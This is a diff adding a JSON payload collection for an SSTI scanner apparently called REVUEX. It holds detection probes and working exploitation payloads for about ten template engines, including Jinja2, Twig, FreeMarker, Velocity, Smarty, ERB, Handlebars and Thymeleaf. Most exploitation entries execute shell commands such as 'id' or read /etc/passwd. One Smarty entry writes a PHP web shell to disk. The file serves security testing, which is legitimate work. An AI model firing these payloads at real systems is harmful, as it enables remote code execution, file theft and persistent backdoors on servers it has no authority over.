@@ -1,0 +1,213 @@
+{
+  "metadata": {
+    "name": "SSTI Payloads",
+    "version": "1.0.0",
+    "description": "Comprehensive SSTI payload collection for REVUEX SSTI Scanner GOLD",
+    "author": "REVUEX Team"
+  },
+  "detection": {
+    "description": "Safe detection payloads for initial SSTI identification",
+    "payloads": [
+      "{{7*7}}",
+      "${7*7}",
+      "<%= 7*7 %>",
+      "#{7*7}",
+      "*{7*7}",
+      "@(7*7)",
+      "${{7*7}}",
+      "{{7*'7'}}",
+      "{{config}}",
+      "{{self}}",
+      "{{request}}",
+      "{{settings}}",
+      "[[7*7]]",
+      "{7*7}",
+      "<%=7*7%>",
+      "{{49}}",
+      "${49}",
+      "#{49}"
+    ],
+    "expected_outputs": {
+      "{{7*7}}": "49",
+      "${7*7}": "49",
+      "<%= 7*7 %>": "49",
+      "#{7*7}": "49",
+      "{{7*'7'}}": "7777777"
+    }
+  },
+  "jinja2": {
+    "description": "Jinja2/Flask SSTI payloads",
+    "detection": [
+      "{{7*7}}",
+      "{{7*'7'}}",
+      "{{config}}",
+      "{{config.items()}}",
+      "{{self.__class__}}",
+      "{{request.application}}"
+    ],
+    "exploitation": [
+      "{{''.__class__.__mro__[2].__subclasses__()}}",
+      "{{''.__class__.__base__.__subclasses__()}}",
+      "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+      "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].wsgi_app.__self__._app}}",
+      "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
+      "{{url_for.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
+      "{{lipsum.__globals__['os'].popen('id').read()}}",
+      "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+      "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+      "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+    ],
+    "info_disclosure": [
+      "{{config}}",
+      "{{request.environ}}",
+      "{{request.headers}}",
+      "{{self.__dict__}}",
+      "{{g}}"
+    ]
+  },
+  "twig": {
+    "description": "Twig (PHP) SSTI payloads",
+    "detection": [
+      "{{7*7}}",
+      "{{7*'7'}}",
+      "{{dump(app)}}",
+      "{{app.request.server.all|join(',')}}",
+      "{{_self}}"
+    ],
+    "exploitation": [
+      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+      "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}",
+      "{{['id']|filter('system')}}",
+      "{{['cat /etc/passwd']|filter('exec')}}",
+      "{{app.request.query.filter(0,'id',1024,{'options':'system'})}}",
+      "{{'id'|filter('passthru')}}"
+    ],
+    "info_disclosure": [
+      "{{_self.env}}",
+      "{{app.request.server.all}}",
+      "{{dump(app)}}"
+    ]
+  },
+  "freemarker": {
+    "description": "FreeMarker (Java) SSTI payloads",
+    "detection": [
+      "${7*7}",
+      "${\"z\".getClass()}",
+      "<#assign x=7*7>${x}",
+      "[#assign x=7*7]${x}[/#assign]"
+    ],
+    "exploitation": [
+      "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+      "${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")}",
+      "<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}"
+    ],
+    "info_disclosure": [
+      "${.data_model}",
+      "${.globals}",
+      "${.namespace}"
+    ]
+  },
+  "velocity": {
+    "description": "Velocity (Java) SSTI payloads",
+    "detection": [
+      "#set($x=7*7)$x",
+      "$class.inspect(\"java.lang.Runtime\")",
+      "#set($str=$class.inspect(\"java.lang.String\").type)"
+    ],
+    "exploitation": [
+      "#set($runtime=$class.inspect(\"java.lang.Runtime\").type.getRuntime())#set($process=$runtime.exec(\"id\"))#set($reader=$class.inspect(\"java.io.BufferedReader\").type.getConstructor($class.inspect(\"java.io.Reader\").type).newInstance($class.inspect(\"java.io.InputStreamReader\").type.getConstructor($class.inspect(\"java.io.InputStream\").type).newInstance($process.getInputStream())))#foreach($line in $reader.lines().toArray())$line#end"
+    ]
+  },
+  "smarty": {
+    "description": "Smarty (PHP) SSTI payloads",
+    "detection": [
+      "{$smarty.version}",
+      "{php}echo 7*7;{/php}",
+      "{7*7}"
+    ],
+    "exploitation": [
+      "{php}system('id');{/php}",
+      "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
+      "{system('id')}",
+      "{passthru('id')}"
+    ]
+  },
+  "mako": {
+    "description": "Mako (Python) SSTI payloads",
+    "detection": [
+      "${7*7}",
+      "${self.module.cache.util.os}",
+      "<%import os%>${os.popen('id').read()}"
+    ],
+    "exploitation": [
+      "<%import os%>${os.popen('id').read()}",
+      "${self.module.cache.util.os.system('id')}",
+      "<%import subprocess%>${subprocess.check_output('id', shell=True)}"
+    ]
+  },
+  "erb": {
+    "description": "ERB (Ruby) SSTI payloads",
+    "detection": [
+      "<%= 7*7 %>",
+      "<%= self %>",
+      "<%= Dir.entries('/') %>"
+    ],
+    "exploitation": [
+      "<%= system('id') %>",
+      "<%= `id` %>",
+      "<%= IO.popen('id').readlines() %>",
+      "<%= File.open('/etc/passwd').read %>",
+      "<%= require 'open3'; Open3.capture2('id')[0] %>"
+    ]
+  },
+  "handlebars": {
+    "description": "Handlebars SSTI payloads",
+    "detection": [
+      "{{this}}",
+      "{{this.constructor.constructor('return this')()}}"
+    ],
+    "exploitation": [
+      "{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').execSync('id');\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}"
+    ]
+  },
+  "pug": {
+    "description": "Pug/Jade SSTI payloads",
+    "detection": [
+      "#{7*7}",
+      "#{self}",
+      "-var x=7*7\n=x"
+    ],
+    "exploitation": [
+      "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('id')}()}",
+      "-var x=global.process.mainModule.require('child_process').execSync('id')\n=x"
+    ]
+  },
+  "thymeleaf": {
+    "description": "Thymeleaf (Java) SSTI payloads",
+    "detection": [
+      "${7*7}",
+      "${T(java.lang.Runtime)}",
+      "*{T(java.lang.Runtime)}"
+    ],
+    "exploitation": [
+      "${T(java.lang.Runtime).getRuntime().exec('id')}",
+      "${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}",
+      "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
+      "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"
+    ]
+  },
+  "safe_detection_sequence": {
+    "description": "Recommended safe detection sequence",
+    "payloads": [
+      {"payload": "{{7*7}}", "engine": ["jinja2", "twig", "nunjucks"]},
+      {"payload": "${7*7}", "engine": ["freemarker", "velocity", "mako", "thymeleaf"]},
+      {"payload": "<%= 7*7 %>", "engine": ["erb", "ejs"]},
+      {"payload": "#{7*7}", "engine": ["pug", "slim"]},
+      {"payload": "*{7*7}", "engine": ["thymeleaf"]},
+      {"payload": "@(7*7)", "engine": ["razor"]},
+      {"payload": "{7*7}", "engine": ["smarty"]},
+      {"payload": "{{config}}", "engine": ["jinja2", "flask"]},
+      {"payload": "{{self}}", "engine": ["jinja2", "twig"]}
+    ]
+  }
+}
